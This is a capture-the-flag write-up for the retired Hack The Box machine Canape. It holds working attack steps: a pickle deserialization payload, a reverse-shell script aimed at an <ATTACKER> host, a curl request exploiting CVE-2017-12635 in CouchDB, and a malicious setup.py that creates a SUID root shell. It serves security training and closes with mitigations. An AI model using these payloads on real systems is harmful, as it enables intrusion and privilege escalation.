---
machine: Canape
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, git, pickle, couchdb, privesc]
---

# Canape — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The site exposes its `.git` repository, revealing a Flask app with `cPickle.loads` on uploaded files. Serialize an object with `__reduce__` to run commands and get `www-data`. CouchDB listens only on localhost and is vulnerable to CVE-2017-12635: create an admin with duplicate roles, read credentials and log in as `homer`. `sudo pip install *` runs a malicious `setup.py` as root.

## Recon

```bash
nmap -Pn -sCV -p80,65535 <IP>
```

- `80/tcp` serves a Simpsons fan site and `65535/tcp` is SSH.
- The script scan detects an exposed `/.git/`.
- `wget --mirror -I .git` retrieves the repository and `git checkout -- .` rebuilds the source.

## Enumeration

- The Flask application writes the concatenation of `character` and `quote` to `/tmp/<md5>.p`.
- `/check` reads the file and, if it contains `p1`, calls `cPickle.loads`.
- CouchDB listens on `127.0.0.1:5984` and stores quotes and passwords.

## Foothold

Create a class with `__reduce__` returning `os.system`, serialize it with `cPickle`, split it into `character`/`quote` to pass the allowlist and send it to `/submit`; then call `/check`.

```python
class Exploit:
    def __reduce__(self):
        return (os.system, ("id",))
```

```bash
python2 get_canape_shell.py <ATTACKER> 4444
```

## Lateral movement

As `www-data`, query CouchDB. The `passwords` database is not accessible, but CVE-2017-12635 allows registering an admin by sending duplicate `roles` keys; the JavaScript validator sees one and Erlang keeps the other.

```bash
curl -X PUT -d '{"type":"user","name":"<USER>","roles":["_admin"],"roles":[],"password":"<PASSWORD>"}' http://localhost:5984/_users/org.couchdb.user:<USER>
```

Read the SSH credentials and log in as `homer` on port 65535.

## Privilege escalation

`homer` can run `pip install *` as root. A `setup.py` with a custom `install` class executes code during installation.

```python
from setuptools import setup
from setuptools.command.install import install

class Exploit(install):
    def run(self):
        import os
        os.system("cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash")

setup(cmdclass={"install": Exploit})
```

```bash
sudo pip install .
/tmp/rootbash -p
```

## Evidence

- `.git` repository and the source of `/submit` and `/check`.
- Malicious pickle and a `www-data` shell.
- CVE-2017-12635 and `homer` credentials.
- `setup.py` executed by privileged `pip`.

## Lessons learned

- An exposed `.git` hands over the application code and logic.
- Deserializing user data with pickle enables direct execution.
- Dependencies installed with privileges run `setup.py` code.

## Mitigation and detection

- Do not publish `.git` and review content before deployment.
- Replace pickle with JSON and validate data types.
- Do not let an unprivileged user install packages as root.

## References

- [0xdf — Canape](https://0xdf.gitlab.io/2018/09/15/htb-canape.html)
- [IppSec — Canape](https://www.youtube.com/watch?v=rs75y2qPonc)
- [Hack The Box — Canape](https://app.hackthebox.com/machines/canape)
